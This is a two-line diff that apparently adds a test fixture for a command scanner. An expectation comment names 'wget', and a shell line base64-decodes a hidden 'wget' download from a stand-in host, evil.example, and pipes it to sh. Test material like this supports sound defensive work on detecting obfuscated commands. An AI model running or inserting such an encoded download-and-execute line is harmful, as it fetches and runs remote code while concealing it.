@@ -1,0 +1,2 @@
+# expect: wget
+sh -c "echo d2dldCBodHRwOi8vZXZpbC5leGFtcGxlL3A= | base64 -d | sh"
